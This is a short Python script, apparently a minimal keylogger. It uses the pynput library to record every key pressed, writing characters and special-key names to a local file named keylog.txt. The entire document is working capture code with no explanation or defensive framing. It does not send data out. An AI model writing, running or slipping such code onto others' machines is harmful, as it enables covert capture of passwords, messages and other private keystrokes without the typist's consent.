import pynput
import logging
from pynput.keyboard import Listener, Key

filename = "keylog.txt"

def on_press(key):
    f = open(filename, 'a')
    if hasattr(key, 'char'):
        f.write(key.char)
    elif key == key.space:
        f.write(' ')
    elif key == key.enter:
        f.write('\n')
    elif key == key.tab:
        f.write('\t')
    else:
        f.write('[' + key.name + ']')
    f.close()
    
with Listener(on_press=on_press) as listener:
    listener.join()